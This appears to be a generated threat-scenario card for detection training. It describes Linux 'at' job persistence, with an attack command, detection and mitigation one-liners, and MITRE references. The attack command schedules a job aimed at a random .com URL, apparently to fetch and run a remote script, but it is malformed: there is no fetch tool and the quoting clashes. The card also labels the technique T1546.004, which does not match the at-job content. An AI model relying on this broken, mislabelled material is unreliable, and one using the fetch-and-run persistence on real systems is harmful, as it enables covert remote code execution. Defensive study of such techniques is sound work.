---
type: campaign
scenario_id: 305
tactic: Persistence
technique: "T1546.004: Unix Shell Configuration Modification"
technique_id: T1546.004
tags: [campaign, lotl, persistence]
---

# Abusing Linux at command for scheduled task persistence.

## Threat Description
Abusing Linux at command for scheduled task persistence.

## Attack Command
```
echo "/bin/bash -c 'http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)sh'" | at now + 1 minute
```

## Detection Logic
Monitor at jobs: `atq | grep http`; Audit at changes: `auditctl -w /etc/at.allow -p wa`.

## Mitigation
Restrict at: `chmod 700 /usr/bin/at`; Disable at service: `systemctl disable atd`.

## AI Training Prompt
Train AI to detect at command tampering and suggest service restrictions.

## References
- MITRE ATT&CK T1546.004: https://attack.mitre.org/techniques/T1546/004/
- CWE-732: https://cwe.mitre.org/data/definitions/732.html
